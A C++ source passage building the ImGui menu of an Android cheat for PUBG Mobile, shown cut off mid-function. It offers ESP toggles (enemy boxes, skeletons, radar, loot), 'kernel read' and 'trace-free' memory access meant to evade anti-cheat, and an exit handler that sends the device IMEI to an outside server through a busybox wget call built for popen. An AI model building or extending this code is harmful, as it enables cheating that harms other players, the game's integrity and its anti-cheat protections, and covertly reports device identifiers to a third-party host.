        //  第一行：状态卡片
        // =============================================================
        ImGui::SetCursorPos(ImVec2(kSideMargin, 14));
        ImGui::BeginChild("##StatusCard", ImVec2(-1, kStatusH), true);
        {
            const float childW = ImGui::GetContentRegionAvail().x;
            const bool connected = (绘制.地址.世界地址 != 0x0);

            ImGui::SetCursorPos(ImVec2(kInnerPad, 12));
            ImGui::TextColored(
                connected ? ImVec4(0.20f, 0.85f, 0.45f, 1.0f)
                          : ImVec4(1.00f, 0.35f, 0.35f, 1.0f),
                connected ? "● 已连接" : "○ 未连接");

            ImGui::SetCursorPos(ImVec2(170.0f, 12));
            ImGui::TextColored(ImVec4(0.55f, 0.75f, 0.95f, 1.0f), "负载");
            ImGui::SameLine();
            ImGui::TextColored(ImVec4(0.90f, 0.90f, 0.90f, 1.0f),
                               "%.1f%%", 绘制.运行负载);

            ImGui::SetCursorPos(ImVec2(310.0f, 12));
            ImGui::TextColored(ImVec4(0.55f, 0.75f, 0.95f, 1.0f), "延迟");
            ImGui::SameLine();
            ImGui::TextColored(ImVec4(0.90f, 0.90f, 0.90f, 1.0f),
                               "%d ms", 绘制.网络延迟);

            ImGui::SetCursorPos(ImVec2(kInnerPad, 52));
            ImGui::TextColored(ImVec4(0.50f, 0.50f, 0.50f, 1.0f),
                               "游戏初始化数据  ·  内核读取  ·  不动内存");

            const float cbW = 130.0f;
            ImGui::SetCursorPos(ImVec2(childW - cbW - 10.0f, 52));
            ImGui::Checkbox("顶部状态栏", &showTopStatusBar);
        }
        ImGui::EndChild();

        // =============================================================
        //  第二行：游戏控制（左） | 快捷信息（右）
        //        两列内容均在各自区域内垂直+水平居中
        // =============================================================
        const float secondY = 14.0f + kStatusH + kCardGap;

        // ── 左列：游戏控制 ────────────────────────────────────────────
        ImGui::SetCursorPos(ImVec2(kSideMargin, secondY));
        ImGui::BeginChild("##GameCtrlLeft", ImVec2(halfW, kSecondH), true);
        {
            const float ctrlW = ImGui::GetContentRegionAvail().x;

            ImGui::SetCursorPos(ImVec2(kInnerPad, 14));
            ImGui::TextColored(ImVec4(0.80f, 0.80f, 0.95f, 1.0f), "游戏控制");
            ImGui::Separator();

            // 三个按钮垂直居中
            const float btnW = ctrlW - 40.0f;       // 按钮宽（左右各20px呼吸空间）
            const float btnH = 42.0f;               // 按钮高
            const float gap = 14.0f;                // 按钮间距
            const float btnsH = btnH * 3 + gap * 2; // 三个按钮总高
            const float topY = kContentTop + (kSecondH - kContentTop - btnsH) * 0.5f;
            const float cx = (ctrlW - btnW) * 0.5f; // 水平居中

            // 按钮 1
            ImGui::SetCursorPos(ImVec2(cx, topY));
            if (ImGui::Button("扫描解密", ImVec2(btnW, btnH)))
            {
                绘制.解密数组选择窗口开启 = true;
                if (绘制.解密地址列表.empty())
                    绘制.重新扫描解密地址();
            }

            // 按钮 2
            ImGui::SetCursorPos(ImVec2(cx, topY + (btnH + gap)));
            {
                bool active = 绘制.按钮.解密;
                ImGui::PushStyleColor(
                    ImGuiCol_Button,
                    active ? ImVec4(0.18f, 0.68f, 0.38f, 0.85f)
                           : ImVec4(0.40f, 0.40f, 0.40f, 0.80f));
                if (ImGui::Button(active ? "解密已启用" : "数组解密",
                                  ImVec2(btnW, btnH)))
                {
                    绘制.按钮.解密 = !active;
                    AddNotification(active ? "解密禁用" : "解密启用", true);
                }
                ImGui::PopStyleColor();
            }

            // 按钮 3
            ImGui::SetCursorPos(ImVec2(cx, topY + (btnH + gap) * 2));
            {
                bool active = 绘制.按钮.坐标解密;
                ImGui::PushStyleColor(
                    ImGuiCol_Button,
                    active ? ImVec4(0.18f, 0.68f, 0.38f, 0.85f)
                           : ImVec4(0.40f, 0.40f, 0.40f, 0.80f));
                ImGui::PushStyleColor(
                    ImGuiCol_ButtonHovered,
                    ImVec4(0.28f, 0.78f, 0.48f, 0.92f));
                if (ImGui::Button(active ? "坐标解密: 开" : "坐标解密: 关",
                                  ImVec2(btnW, btnH)))
                {
                    绘制.按钮.坐标解密 = !active;
                    AddNotification(active ? "坐标解密已关闭" : "坐标解密已开启",
                                    true);
                }
                ImGui::PopStyleColor(2);
            }
        }
        ImGui::EndChild();

        // ── 右列：快捷信息（垂直堆叠 4 行，值完整显示） ──────────────
        ImGui::SameLine();
        ImGui::SetCursorPos(
            ImVec2(kSideMargin + halfW + kCardGap, secondY));
        ImGui::BeginChild("##QuickInfoRight",
                          ImVec2(halfW, kSecondH), true);
        {
            const float infoW = ImGui::GetContentRegionAvail().x;

            ImGui::SetCursorPos(ImVec2(kInnerPad, 14));
            ImGui::TextColored(ImVec4(0.80f, 0.80f, 0.95f, 1.0f), "快捷信息");
            ImGui::Separator();

            // 四行垂直居中
            const float bW = infoW - 36.0f;
            const float bH = 40.0f;
            const float gap = 8.0f;
            const float rowsH = bH * 4 + gap * 3; // 四行总高
            const float startY = kContentTop + (kSecondH - kContentTop - rowsH) * 0.5f;
            const float cx = (infoW - bW) * 0.5f; // 水平居中

            // -- 行1：运行时长 --
            ImGui::SetCursorPos(ImVec2(cx, startY));
            ImGui::BeginChild("##InfoRow1", ImVec2(bW, bH), true);
            {
                ImGui::SetCursorPos(ImVec2(12, 10));
                ImGui::TextColored(ImVec4(0.50f, 0.72f, 1.00f, 1.0f),
                                   "运行时长");
                ImGui::SameLine();
                ImGui::SetCursorPosX(bW - 100.0f);
                ImGui::TextColored(ImVec4(0.90f, 0.90f, 0.90f, 1.0f),
                                   "%.1f min",
                                   ImGui::GetIO().DeltaTime * ImGui::GetFrameCount() / 60.0f);
            }
            ImGui::EndChild();

            // -- 行2：帧率 --
            ImGui::SetCursorPos(ImVec2(cx, startY + (bH + gap)));
            ImGui::BeginChild("##InfoRow2", ImVec2(bW, bH), true);
            {
                ImGui::SetCursorPos(ImVec2(12, 10));
                ImGui::TextColored(ImVec4(0.50f, 0.72f, 1.00f, 1.0f),
                                   "帧率");
                ImGui::SameLine();
                ImGui::SetCursorPosX(bW - 100.0f);
                ImGui::TextColored(ImVec4(0.90f, 0.90f, 0.90f, 1.0f),
                                   "%.0f FPS", ImGui::GetIO().Framerate);
            }
            ImGui::EndChild();

            // -- 行3：游戏窗口 --
            ImGui::SetCursorPos(ImVec2(cx, startY + (bH + gap) * 2));
            ImGui::BeginChild("##InfoRow3", ImVec2(bW, bH), true);
            {
                ImGui::SetCursorPos(ImVec2(12, 10));
                ImGui::TextColored(ImVec4(0.50f, 0.72f, 1.00f, 1.0f),
                                   "游戏窗口");
                ImGui::SameLine();
                ImGui::SetCursorPosX(bW - 150.0f);
                ImGui::TextColored(ImVec4(0.90f, 0.90f, 0.90f, 1.0f),
                                   "%d x %d", abs_ScreenX, abs_ScreenY);
            }
            ImGui::EndChild();

            // -- 行4：内存模式 --
            ImGui::SetCursorPos(ImVec2(cx, startY + (bH + gap) * 3));
            ImGui::BeginChild("##InfoRow4", ImVec2(bW, bH), true);
            {
                ImGui::SetCursorPos(ImVec2(12, 10));
                ImGui::TextColored(ImVec4(0.50f, 0.72f, 1.00f, 1.0f),
                                   "内存模式");
                ImGui::SameLine();
                ImGui::SetCursorPosX(bW - 100.0f);
                ImGui::TextColored(ImVec4(0.90f, 0.90f, 0.90f, 1.0f),
                                   "%s", 无痕读取开启 ? "无痕" : "标准");
            }
            ImGui::EndChild();
        }
        ImGui::EndChild();

        // =============================================================
        //  第三行：底部操作栏
        // =============================================================
        const float thirdY = secondY + kSecondH + kCardGap;

        ImGui::SetCursorPos(ImVec2(kSideMargin, thirdY));
        ImGui::BeginChild("##BottomActions", ImVec2(-1, kBottomH), true);
        {
            const float areaW = ImGui::GetContentRegionAvail().x;
            const float gap = 16.0f;
            const float btnW = (areaW - 36.0f - gap) * 0.5f;
            const float btnH = 44.0f;
            const float btnY = (kBottomH - btnH) * 0.5f;
            const float cx = (areaW - btnW * 2 - gap) * 0.5f;

            ImGui::SetCursorPos(ImVec2(cx, btnY));
            ImGui::PushStyleColor(ImGuiCol_Button,
                                  ImVec4(0.18f, 0.52f, 0.82f, 0.92f));
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered,
                                  ImVec4(0.22f, 0.62f, 0.92f, 1.00f));
            ImGui::PushStyleColor(ImGuiCol_ButtonActive,
                                  ImVec4(0.14f, 0.42f, 0.72f, 1.00f));
            if (ImGui::Button("链接游戏", ImVec2(btnW, btnH)))
            {
                绘制.初始化绘制("com.tencent.tmgp.pubgmhd",
                                abs_ScreenX, abs_ScreenY);
                绘制.按钮.绘制 = true;
                绘制.按钮.人数 = true;
            }
            ImGui::PopStyleColor(3);

            ImGui::SameLine();
            ImGui::SetCursorPos(ImVec2(cx + btnW + gap, btnY));
            ImGui::PushStyleColor(ImGuiCol_Button,
                                  ImVec4(0.68f, 0.18f, 0.18f, 0.88f));
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered,
                                  ImVec4(0.78f, 0.22f, 0.22f, 0.96f));
            if (ImGui::Button("退出程序", ImVec2(btnW, btnH)))
            {
                g_volumeThreadRunning = false;
                if (无痕读取开启 && std::filesystem::exists(备份目录))
                    RestoreADBDirectory();

                std::thread([]()
                            {
                    std::string did = getIMEI();
                    std::string url = "https://mt.xiaon.sbs/api.php"
                                      "?action=report_script_offline"
                                      "&device_id=" + did;
                    std::string cmd = "busybox wget -q --timeout=3 -O- '"
                                      + url + "' 2>/dev/null";
                    FILE* p = popen(cmd.c_str(), "r");
                    if (p) pclose(p); })
                    .detach();

                exit(1);
            }
            ImGui::PopStyleColor(2);
        }
        ImGui::EndChild();
    }
    ImGui::EndChild();
}

// ---------- 人物页面 ----------
void DrawCharacterPage()
{
    ImGui::BeginChild("##CharacterContent", ImVec2(-1, -1), true);
    ImGui::SetCursorPos(ImVec2(20, 20));

    static const char *血条样式选项[] = {"简约", "赛事", "分格", "无ui"};
    ImGui::Text("血条样式");
    ImGui::SameLine(150);
    ImGui::SetNextItemWidth(200);
    ImGui::SliderInt("##血条样式", &绘制.按钮.血条绘图, 0, 3, 血条样式选项[绘制.按钮.血条绘图]);
    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // 三列布局
    ImGui::Columns(3, "##人物列", false);

    struct
    {
        const char *name;
        bool *variable;
    } options[] = {
        {"人物方框", &绘制.按钮.方框},
        {"人物射线", &绘制.按钮.射线},
        {"人物骨骼", &绘制.按钮.骨骼},
        {"手持文字", &绘制.按钮.手持2},
        {"手持图片", &绘制.按钮.手持},
        {"人物血条", &绘制.按钮.血量},
        {"人物距离", &绘制.按钮.距离},
        {"人物名字", &绘制.按钮.名字},
        {"绘制车辆", &绘制.按钮.车辆},
        {"绘制雷达", &绘制.按钮.雷达},
        {"敌人动作", &绘制.按钮.动作},
        {"盒子", &绘制.按钮.盒子},
        {"盒内物资", &绘制.按钮.盒子物资},
        {"被瞄预警", &绘制.按钮.被瞄预警},
        {"背敌预警", &绘制.按钮.背敌预警},
        {"头甲耐久", &绘制.按钮.头甲包显示},
        {"手雷预警", &绘制.按钮.手雷预警},
        {"瞬爆雷预测", &绘制.按钮.瞬爆雷预测},
        {"忽略人机", &绘制.按钮.忽略人机},
        {"全图人数", &绘制.按钮.全图人数},
        {"自救倒计时", &绘制.按钮.自救倒计时},
        {"漏手模式", &绘制.按钮.漏手模式},
        {"掩体变色", &绘制.按钮.物理掩体检测},
        {"模型绘制", &绘制.按钮.模型绘制},
    };

    const int total = IM_ARRAYSIZE(options);
    const int col1_end = (total + 2) / 3; // 6
    const int col2_end = col1_end * 2;    // 12

    for (int i = 0; i < total; i++)
    {
        if (ModernSwitchRight(options[i].name, options[i].variable))
        {
            绘制.保存配置();
            AddNotification(options[i].name, *options[i].variable);
        }
        ImGui::Spacing();

        // 换列
        if (i == col1_end - 1 || i == col2_end - 1)
            ImGui::NextColumn();
    }
    ImGui::Columns(1);
    ImGui::EndChild();
}

// ---------- 物资页面（美化版） ----------
void DrawItemsPage()
{
    ImGui::BeginChild("##ItemsContent", ImVec2(-1, -1), true);
    ImGui::SetCursorPos(ImVec2(20, 20));

    // ---------- 自定义丝滑标签栏 ----------
    static int activeTab = 0;            // 0=通用物资, 1=自定义物资
    static int prevTab = 0;              // 用于动画
    static float tabAnimProgress = 1.0f; // 指示器动画进度 (0~1)
    static float animSpeed = 6.0f;       // 动画速度
    const char *tabs[] = {"通用物资", "自定义物资"};
    const int tabCount = IM_ARRAYSIZE(tabs);

    // 如果标签切换了，重置动画状态
    if (activeTab != prevTab)
    {
        prevTab = activeTab;
        tabAnimProgress = 0.0f;
    }
    // 更新动画进度
    if (tabAnimProgress < 1.0f)
        tabAnimProgress += ImGui::GetIO().DeltaTime * animSpeed;
    if (tabAnimProgress > 1.0f)
        tabAnimProgress = 1.0f;

    ImDrawList *dl = ImGui::GetWindowDrawList();
    ImVec2 tabStart = ImGui::GetCursorScreenPos();
    float tabWidth = 140.0f; // 每个标签的宽度
    float tabHeight = 38.0f;
    float indicatorHeight = 3.0f; // 指示器高度
    float tabSpacing = 8.0f;      // 标签之间的间距
    float totalTabsWidth = tabCount * tabWidth + (tabCount - 1) * tabSpacing;

    // 绘制标签按钮
    for (int i = 0; i < tabCount; i++)
    {
        ImVec2 tabMin = ImVec2(tabStart.x + i * (tabWidth + tabSpacing), tabStart.y);
        ImVec2 tabMax = ImVec2(tabMin.x + tabWidth, tabMin.y + tabHeight);

        // 鼠标悬停检测
        ImVec2 mouse = ImGui::GetMousePos();
        bool hovered = (mouse.x >= tabMin.x && mouse.x <= tabMax.x && mouse.y >= tabMin.y && mouse.y <= tabMax.y);

        // 颜色计算 (激活/悬停/普通)
        ImU32 bgColor, textColor;
        if (activeTab == i)
        {
            bgColor = IM_COL32(30, 120, 200, 40);    // 选中背景 (半透明)
            textColor = IM_COL32(90, 180, 255, 255); // 亮蓝色文字
        }
        else if (hovered)
        {
            bgColor = IM_COL32(60, 60, 70, 40);
            textColor = IM_COL32(200, 200, 200, 255);
        }
        else
        {
            bgColor = IM_COL32(40, 40, 50, 0);
            textColor = IM_COL32(150, 150, 150, 255);
        }

        // 绘制标签背景 (圆角)
        dl->AddRectFilled(tabMin, tabMax, bgColor, 8.0f);
        dl->AddRect(tabMin, tabMax, IM_COL32(80, 80, 90, 40), 8.0f);

        // 居中绘制文字
        ImVec2 textSize = ImGui::CalcTextSize(tabs[i]);
        ImVec2 textPos(tabMin.x + (tabWidth - textSize.x) * 0.5f,
                       tabMin.y + (tabHeight - textSize.y) * 0.5f);
        dl->AddText(textPos, textColor, tabs[i]);

        // 点击处理
        ImGui::SetCursorScreenPos(tabMin);
        if (ImGui::InvisibleButton(tabs[i], ImVec2(tabWidth, tabHeight)))
            activeTab = i;
    }

    // 绘制滑动指示器 (底部蓝条)
    // 计算起始位置 (从旧标签平滑移动到新标签)
    float indicatorStartX = tabStart.x + prevTab * (tabWidth + tabSpacing);
    float indicatorEndX = tabStart.x + activeTab * (tabWidth + tabSpacing);
    float currentIndicatorX = indicatorStartX + (indicatorEndX - indicatorStartX) * tabAnimProgress;
    ImVec2 indicatorMin(currentIndicatorX, tabStart.y + tabHeight - indicatorHeight);
    ImVec2 indicatorMax(currentIndicatorX + tabWidth, tabStart.y + tabHeight);
    dl->AddRectFilled(indicatorMin, indicatorMax, IM_COL32(90, 180, 255, 200), 2.0f);

    ImGui::SetCursorScreenPos(ImVec2(tabStart.x, tabStart.y + tabHeight + 15.0f)); // 留出间距

    // ---------- 页面内容切换 ----------
    if (activeTab == 0)
    {
        // ========== 通用物资 (原内容) ==========
        ImGui::Spacing();
        float availWidth = ImGui::GetContentRegionAvail().x - 20.0f;

        auto DrawCompactCheckboxGroup = [](const char *title, const std::vector<std::pair<const char *, bool *>> &items)
        {
            if (ImGui::CollapsingHeader(title, ImGuiTreeNodeFlags_DefaultOpen))
            {
                ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(12, 10));
                ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(8, 6));
                ImGui::Columns(3, title, false);
                for (size_t i = 0; i < items.size(); ++i)
                {
                    const auto &[name, var] = items[i];
                    if (ModernSwitchRight(name, var))
                    {
                        绘制.保存配置();
                        AddNotification(name, *var);
                    }
                    if ((i + 1) % ((items.size() + 2) / 3) == 0 && i != items.size() - 1)
                        ImGui::NextColumn();
                }
                ImGui::Columns(1);
                ImGui::PopStyleVar(2);
                ImGui::Spacing();
            }
        };

        std::vector<std::pair<const char *, bool *>> specials = {
            {"显示密钥", &绘制.按钮.显示密钥},
            {"头甲", &绘制.按钮.显示防具},
            {"信号枪", &绘制.按钮.绘制信号枪},
            {"空投箱", &绘制.按钮.绘制空投},
            {"金插", &绘制.按钮.绘制金插},
            {"宝箱", &绘制.按钮.绘制宝箱},
            {"超级物资箱", &绘制.按钮.超级物资箱},
            {"武器箱", &绘制.按钮.绘制武器箱},
            {"自救器", &绘制.按钮.显示自救器},
            {"飞索", &绘制.按钮.显示飞索},
            {"密室钥匙", &绘制.按钮.密室钥匙},
            {"黑色物资箱", &绘制.按钮.显示黑色物资箱}};
        DrawCompactCheckboxGroup("特殊物品", specials);

        std::vector<std::pair<const char *, bool *>> tomb = {
            {"隐藏古墓箱子", &绘制.按钮.隐藏古墓已开启},
            {"古墓树木", &绘制.按钮.显示古墓篮子},
            {"古墓华贵宝箱", &绘制.按钮.显示古墓首饰盒},
            {"古墓精致宝箱", &绘制.按钮.显示古墓宝箱},
            {"古墓宝箱", &绘制.按钮.显示古墓精致宝箱},
            {"古墓首饰盒", &绘制.按钮.显示古墓华贵宝箱},
            {"古墓篮子", &绘制.按钮.显示古墓树木}};
        DrawCompactCheckboxGroup("古墓专属", tomb);
    }
    else if (activeTab == 1)
    {
        // ========== 自定义物资 (原内容) ==========
        ImGui::Spacing();

        if (ImGui::Checkbox("启用自定义物资绘制", &绘制.按钮.自定义物资开关))
            绘制.保存配置();

        ImGui::Checkbox("开发者:", &绘制.按钮.Debug);
        ImGui::SameLine();
        ImGui::RadioButton("类名", &绘制.按钮.Debug模式, 0);
        ImGui::SameLine();
        ImGui::RadioButton("地址", &绘制.按钮.Debug模式, 1);
        ImGui::SameLine();
        ImGui::RadioButton("物资ID", &绘制.按钮.Debug模式, 2);
        ImGui::Spacing();
        ImGui::Separator();
        ImGui::Spacing();

        static std::future<bool> loadFuture;
        static bool loadPending = false;
        static bool firstRun = true;
        if (firstRun)
        {
            firstRun = false;
            loadFuture = std::async(std::launch::async, []() -> bool
                                    {
                if (!g_CustomReader) g_CustomReader = new DataReader();
                return g_CustomReader->loadDataFromFile("/sdcard/AuraKernel/自定义物资.txt"); });
            loadPending = true;
        }

        if (ImGui::Button("重新加载数据文件"))
        {
            if (loadPending && loadFuture.valid())
                loadFuture.wait();
            loadFuture = std::async(std::launch::async, []() -> bool
                                    {
                if (!g_CustomReader) g_CustomReader = new DataReader();
                return g_CustomReader->loadDataFromFile("/sdcard/AuraKernel/自定义物资.txt"); });
            loadPending = true;
        }

        if (loadPending && loadFuture.valid())
        {
            auto status = loadFuture.wait_for(std::chrono::seconds(0));
            if (status == std::future_status::ready)
            {
                bool result = loadFuture.get();
                g_CustomDataLoaded = result;
                loadPending = false;
                if (result)
                    AddNotification("自定义物资加载成功", true);
                else
                    AddNotification("加载失败：文件不存在或格式错误", false);
            }
            else
            {
                ImGui::TextColored(ImVec4(1, 1, 0, 1), "文件加载中...");
            }
        }

        if (绘制.按钮.Debug)
        {
            ImGui::Spacing();
            ImGui::Separator();
            ImGui::Spacing();
            ImGui::TextColored(ImVec4(1.0f, 0.8f, 0.0f, 1.0f), "开发者模式");
            ImGui::Text("准星对准: %s", 绘制.bDebugAimedValid ? 绘制.DebugAimedClassName.c_str() : "无");
            if (ImGui::Button("将此类名添加到自定义物资文件"))
            {
                if (!绘制.bDebugAimedValid || 绘制.DebugAimedClassName.empty())
                {
                    AddNotification("没有对准任何物体", false);
                }
                else
                {
                    std::filesystem::create_directories("/sdcard/AuraKernel");
                    std::ofstream file("/sdcard/AuraKernel/自定义物资.txt", std::ios::app);
                    if (file.is_open())
                    {
                        file << "\n//" << 绘制.DebugAimedClassName << "@未命名@255,0,0,255@20\n";
                        file.close();
                        AddNotification("已写入: //" + 绘制.DebugAimedClassName, true);
                    }
                    else
                    {
                        AddNotification("文件写入失败", false);
                    }
                }
            }
            ImGui::TextColored(ImVec4(0.7f, 0.7f, 0.7f, 1.0f), "写入后请点击“重新加载数据文件”生效");
        }

        ImGui::Spacing();
        if (g_CustomDataLoaded)
            ImGui::TextColored(ImVec4(0.3f, 0.9f, 0.3f, 1.0f), "状态: 已加载");
        else
            ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.4f, 1.0f), "状态: 未加载");
    }

    ImGui::EndChild();
}

// ---------- 视觉页面 ----------
void DrawVisualPage()
{
    ImGui::BeginChild("##VisualContent", ImVec2(-1, -1), true);

    // 增大滚动条宽度（仅影响当前子窗口）
    ImGui::PushStyleVar(ImGuiStyleVar_ScrollbarSize, 16.0f);

    ImGui::SetCursorPos(ImVec2(20, 20));

    // 手雷样式
    ImGui::Text("手雷样式");
    ImGui::SameLine(150);
    static const char *手雷样式选项[] = {"3D", "曲线"};
    ImGui::SetNextItemWidth(200);
    ImGui::SliderInt("##手雷样式", &绘制.按钮.手雷样式, 0, 1, 手雷样式选项[绘制.按钮.手雷样式]);
    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    const float slider_width = 280.0f;

    // 简化后的行间距：仅增加 2px 的虚拟占位
    auto ItemSpacing = [&]()
    {
        ImGui::Dummy(ImVec2(0, 1.0f));
    };

    // 1. 绘制距离
    ModernSliderInt("绘制距离", &绘制.按钮.绘制最大距离, 100, 500, "%.0f 米", slider_width);
    ItemSpacing();

    // 2. 骨骼距离
    ModernSliderFloat("骨骼距离", &绘制.骨骼距离限制, 100.0f, 500.0f, "%.0f 米", slider_width);
    ItemSpacing();

    // 3. 方框粗细
    ModernSliderFloat("方框粗细", &绘制.按钮.方框粗细, 0.1f, 5.0f, "%.1f", slider_width);
    ItemSpacing();

    // 4. 射线粗细
    ModernSliderFloat("射线粗细", &绘制.按钮.射线粗细, 0.1f, 5.0f, "%.1f", slider_width);
    ItemSpacing();

    // 5. 骨骼粗细
    ModernSliderFloat("骨骼粗细", &绘制.按钮.骨骼粗细, 0.1f, 5.0f, "%.1f", slider_width);
    ItemSpacing();

    // 6. 雷达X
    ModernSliderFloat("雷达X", &绘制.按钮.雷达X, 0.0f, 2400.0f, "%.0f", slider_width);
    ItemSpacing();

    // 7. 雷达Y
    ModernSliderFloat("雷达Y", &绘制.按钮.雷达Y, 0.0f, 1080.0f, "%.0f", slider_width);
    ItemSpacing();

    // 8. 动作字体
    ModernSliderInt("动作字体", &绘制.动作字体大小, 6, 40, "%.0f", slider_width);
    ItemSpacing();

    // 9. 距离字体
    ModernSliderInt("距离字体", &绘制.距离字体大小, 6, 40, "%.0f", slider_width);
    ItemSpacing();

    // 10. 手持字体
    ModernSliderInt("手持字体", &绘制.手持字体大小, 6, 40, "%.0f", slider_width);
    ItemSpacing();

    // 11. 物资字体
    ModernSliderInt("物资字体", &绘制.物资字体大小, 6, 40, "%.0f", slider_width);
    ItemSpacing();

    ItemSpacing();
    ImGui::Separator();
    ImGui::Spacing();

    // PhysX Pro 模型绘制开关
    ImGui::Text("模型绘制");
    ImGui::SameLine(150);
    if (ImGui::Checkbox("##模型绘制", &绘制.按钮.模型绘制))
    {
        绘制.保存配置();
        AddNotification("模型绘制", 绘制.按钮.模型绘制);
    }
    ImGui::SameLine();
    ImGui::TextColored(ImVec4(0.3f, 0.8f, 1.0f, 1.0f), "三角形网格渲染");

    ItemSpacing();

    // PhysX Pro 掩体变色开关
    ImGui::Text("掩体变色");
    ImGui::SameLine(150);
    if (ImGui::Checkbox("##掩体变色", &绘制.按钮.物理掩体检测))
    {
        绘制.保存配置();
        AddNotification("掩体变色", 绘制.按钮.物理掩体检测);
    }
    ImGui::SameLine();
    ImGui::TextColored(ImVec4(0.3f, 1.0f, 0.3f, 1.0f), "LinePosition射线检测");

    ImGui::PopStyleVar(); // 恢复滚动条大小
    ImGui::EndChild();
}

void DrawColorPage()
{
    ImGui::BeginChild("##ColorContent", ImVec2(-1, -1), true);
    ImGui::SetCursorPos(ImVec2(20, 20));

    // ====================== 真人/人机 分段式切换按钮 ======================
    ImGui::Text("当前配置");
    ImGui::SameLine(120);

    ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0, 0));
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 6.0f);

    // 真人按钮
    ImGui::PushStyleColor(ImGuiCol_Button, ColorSettings == 0 ? ImVec4(0.2f, 0.6f, 1.0f, 0.8f) : ImVec4(0.25f, 0.25f, 0.28f, 0.7f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ColorSettings == 0 ? ImVec4(0.3f, 0.7f, 1.0f, 0.9f) : ImVec4(0.35f, 0.35f, 0.38f, 0.8f));
    ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.15f, 0.5f, 0.9f, 1.0f));
    if (ImGui::Button("真人", ImVec2(90, 40)))
    {
        ColorSettings = 0;
        绘制.保存配置();
    }
    ImGui::PopStyleColor(3);

    // 人机按钮
    ImGui::SameLine();
    ImGui::PushStyleColor(ImGuiCol_Button, ColorSettings == 1 ? ImVec4(0.2f, 0.6f, 1.0f, 0.8f) : ImVec4(0.25f, 0.25f, 0.28f, 0.7f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ColorSettings == 1 ? ImVec4(0.3f, 0.7f, 1.0f, 0.9f) : ImVec4(0.35f, 0.35f, 0.38f, 0.8f));
    ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.15f, 0.5f, 0.9f, 1.0f));
    if (ImGui::Button("人机", ImVec2(90, 40)))
    {
        ColorSettings = 1;
        绘制.保存配置();
    }
    ImGui::PopStyleColor(3);
    ImGui::PopStyleVar(2);

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // ====================== 预定义颜色配置 ======================
    static const ImVec4 presetColors[] = {
        {0.0f, 1.0f, 0.0f, 1.0f}, // 绿色
        {0.0f, 0.0f, 1.0f, 1.0f}, // 蓝色
        {1.0f, 0.0f, 1.0f, 1.0f}, // 紫色
        {1.0f, 1.0f, 1.0f, 1.0f}, // 白色
        {1.0f, 0.0f, 0.0f, 1.0f}, // 红色
        {1.0f, 0.6f, 0.0f, 1.0f}, // 橙色
        {1.0f, 0.4f, 0.7f, 1.0f}, // 粉色
        {0.2f, 0.7f, 1.0f, 1.0f}, // 天蓝色
        {0.4f, 0.8f, 0.4f, 1.0f}, // 嫩绿色
        {0.8f, 0.5f, 1.0f, 1.0f}, // 浅紫 / 薰衣草
        {1.0f, 0.8f, 0.4f, 1.0f}, // 香槟金
        {1.0f, 0.5f, 0.5f, 1.0f}, // 珊瑚红
        {0.4f, 0.4f, 0.4f, 1.0f}, // 深灰色
        {0.5f, 0.8f, 1.0f, 1.0f}, // 淡蓝
        {1.0f, 0.9f, 0.6f, 1.0f}, // 奶油色
        {0.7f, 0.3f, 0.3f, 1.0f}, // 暗红 / 砖红
        {0.0f, 0.5f, 0.5f, 1.0f}  // 蓝绿 (Teal)
    };
    static const char *presetNames[] = {"绿色", "蓝色", "紫色", "白色", "红色", "橙色", "粉色", "天蓝色", "嫩绿色", "浅紫", "香槟金", "珊瑚红", "深灰色", "淡蓝", "奶油色", "暗红", "蓝绿"};
    const int presetCount = IM_ARRAYSIZE(presetColors);

    // 获取颜色名称
    auto GetColorName = [&](const float *color) -> std::string
    {
        for (int i = 0; i < presetCount; i++)
        {
            if (fabsf(color[0] - presetColors[i].x) < 0.01f &&
                fabsf(color[1] - presetColors[i].y) < 0.01f &&
                fabsf(color[2] - presetColors[i].z) < 0.01f)
            {
                return presetNames[i];
            }
        }
        return "自定义";
    };

    // 切换预定义颜色
    auto SwitchPresetColor = [&](float *color, int delta)
    {
        int currentIndex = -1;
        for (int i = 0; i < presetCount; i++)
        {
            if (fabsf(color[0] - presetColors[i].x) < 0.01f &&
                fabsf(color[1] - presetColors[i].y) < 0.01f &&
                fabsf(color[2] - presetColors[i].z) < 0.01f)
            {
                currentIndex = i;
                break;
            }
        }
        currentIndex = (currentIndex == -1) ? 0 : (currentIndex + delta + presetCount) % presetCount;
        color[0] = presetColors[currentIndex].x;
        color[1] = presetColors[currentIndex].y;
        color[2] = presetColors[currentIndex].z;
        color[3] = presetColors[currentIndex].w;
        绘制.保存配置();
    };

    // ====================== 颜色项数据 ======================
    int colorSetIndex = ColorSettings;
    const char *colorLabels[] = {
    "方框可见", "方框掩体",
    "射线可见", "射线掩体",
    "骨骼可见", "骨骼掩体",
    "距离颜色", "名称颜色", "车辆颜色"
};

    float *colorPointers[] = {
        绘制.Colorset[colorSetIndex].方框颜色,
        绘制.Colorset[colorSetIndex].方框掩体颜色,
        绘制.Colorset[colorSetIndex].射线颜色,
        绘制.Colorset[colorSetIndex].射线掩体颜色,
        绘制.Colorset[colorSetIndex].骨骼颜色,
        绘制.Colorset[colorSetIndex].骨骼掩体颜色,
        绘制.Colorset[colorSetIndex].距离颜色,
        绘制.Colorset[colorSetIndex].名称颜色,
        绘制.车辆颜色};

    // ====================== 表格布局 ======================
    if (ImGui::BeginTable("ColorTable", 3, ImGuiTableFlags_SizingStretchSame))
    {
        ImGui::TableSetupColumn("标签", ImGuiTableColumnFlags_WidthFixed, 110);
        ImGui::TableSetupColumn("调节", ImGuiTableColumnFlags_WidthStretch);
        ImGui::TableSetupColumn("颜色", ImGuiTableColumnFlags_WidthFixed, 70);

        for (int i = 0; i < IM_ARRAYSIZE(colorLabels); i++)
        {
            ImGui::TableNextRow();
            float *col = colorPointers[i];
